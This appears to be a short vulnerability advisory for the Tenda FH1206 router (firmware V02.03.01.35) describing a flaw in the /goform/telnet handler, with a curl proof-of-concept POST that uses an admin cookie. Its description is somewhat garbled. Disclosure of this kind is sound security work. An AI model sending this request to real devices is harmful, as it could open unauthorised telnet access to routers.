## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2905.html

## Affected version

FH1206 V02.03.01.35

## Vulnerability details

An issue was discovered in FH1206 V02.03.01.35 devices. An HTTP request within the handler function of the /goform/telnet route. This could lead to Shell Metacharacters.

![image-20240731144148125](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731144148125.png)

## POC

```python
curl -i -X POST http://192.168.84.101/goform/telnet -d aa=aa --cookie "user=admin" --http0.9
```

![image-20240802225428603](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240802225428603.png)